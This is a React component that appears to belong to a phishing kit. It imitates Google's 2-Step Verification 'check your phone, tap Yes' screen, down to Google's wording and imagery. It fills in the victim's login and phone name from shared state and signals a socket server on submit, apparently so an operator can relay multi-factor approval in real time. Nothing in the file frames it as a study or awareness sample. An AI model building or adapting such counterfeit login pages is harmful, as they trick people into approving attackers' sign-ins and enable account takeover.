'use client';
import { FormEvent, useContext, useState } from 'react';
import styles from '../Google.module.scss';
import { socket } from '../../socket';
import { GoogleContext } from '../Google';
import Checkbox from '../checkbox/Checkbox';

export default function Yes() {
	const { data } = useContext(GoogleContext);
	const [dontAsk, setDontAsk] = useState(true);

	const handleSubmit = (e: FormEvent | null) => {
		if (e) e.preventDefault();
		socket.emit('google-password');
	};

	return (
		<form onSubmit={handleSubmit} className={styles.form}>
			<div className={styles.title}>2-Step Verification</div>
			<div className={styles.sub_title} style={{ marginBottom: '0px' }}>
				To help keep your account safe, Google wants to make sure it’s really you trying to sign in
			</div>
			<div className={styles.profile} style={{ marginBottom: '60px' }}>
				<svg aria-hidden='true' fill='currentColor' focusable='false' width='48px' height='48px' viewBox='0 0 24 24' xmlns='https://www.w3.org/2000/svg'>
					<path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z'></path>
				</svg>
				{data?.login}
			</div>

			<figure aria-hidden='true' data-illustration='authzenDefault'>
				<div className={styles.phone_back}></div>
				<img src='https://ssl.gstatic.com/accounts/embedded/signin_tapyes.gif' aria-hidden='true' alt='' data-iml='315629' />
			</figure>
			<h2>Check your {data?.phoneName}</h2>
			<h3>
				Google sent a notification to your {data?.phoneName}. Tap <strong>Yes</strong> on the notification to verify it’s you.
			</h3>
			<div className={styles.show_pass} onClick={() => setDontAsk(!dontAsk)} style={{ fontWeight: '400', padding: '16px 0' }}>
				<Checkbox active={dontAsk} onClick={setDontAsk} />
				Don’t ask again on this device
			</div>

			<button type='submit' className={styles.white_button} style={{ margin: '30px 0', fontWeight: '400', marginLeft: '-5px' }}>
				Resend it
			</button>
			<br />
			<button type='submit' className={styles.white_button} style={{ fontWeight: '400', marginLeft: '-5px' }}>
				Try another way
			</button>
		</form>
	);
}
